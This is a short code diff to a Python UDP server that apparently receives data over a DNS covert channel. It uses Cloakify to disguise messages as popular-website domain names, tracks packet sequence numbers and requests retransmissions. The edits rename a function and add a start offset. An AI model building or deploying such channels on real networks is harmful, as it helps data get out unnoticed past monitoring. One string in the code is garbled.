@@ -13,7 +13,7 @@ os.environ["EOTUrl"] = "endOfTransmission.google.com"
 key = b'VijMwRNSQHALXQodmjCdH4UB7SCw/+EpnuBXfko7ReyqG3oYAky0eYxxx92xi49q'[:32]
 
 
-def retransmit(seq_id):
+def request_retransmit(seq_id):
     cipher = "ciphers\\common_fqdn\\topWebsites"
     cloaked_restrasmission = "cloaked_retramission.txt"
     Cloakify('�{seq_id}', cipher, cloaked_restrasmission)
@@ -93,7 +93,7 @@ def is_dns_query_of_type_a(data):
         logging.error(f"Error parsing DNS query: {e}")
     return False
 
-def start_udp_server():
+def start_udp_server(start_id=0):
     # Configure logging
     logging.basicConfig(level=logging.INFO)
 
@@ -141,11 +141,12 @@ def start_udp_server():
                     elif seq_id != packet_id:
                         print(f"Packet mismatch: Expected {seq_id}, but got {packet_id}")
                         print("Requesting re-transmission.")
-                        retransmit(seq_id)
+                        request_retransmit(seq_id)
                         # Non incrementiamo seq_id qui perché il pacchetto non è corretto
                     else:
                         print(f"Packet {seq_id} received correctly")
-                        append_domain(FQDN)
+                        if seq_id >= start_id:
+                            append_domain(FQDN)
                         received_packets.add(packet_id)
                         seq_id += 1  # Incrementiamo solo quando riceviamo il pacchetto corretto
                 
